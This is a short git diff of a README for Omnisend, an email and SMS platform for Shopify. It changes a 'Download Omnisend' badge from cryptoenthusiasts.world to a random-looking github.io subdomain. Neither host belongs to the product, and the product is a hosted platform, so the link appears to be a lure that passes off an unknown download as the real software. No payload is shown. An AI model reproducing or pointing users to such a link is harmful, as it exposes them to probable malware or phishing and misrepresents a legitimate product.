@@ -2,7 +2,7 @@
 
 Omnisend is an email & SMS platform for Shopify with prebuilt automations and AI content tools.
 
-[![Download Omnisend](https://img.shields.io/badge/Download-Omnisend-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Omnisend](https://img.shields.io/badge/Download-Omnisend-blueviolet)](https://aunewoytowiczqkbsvo.github.io/.github/Omnisend-Labs)
 
 ---
 
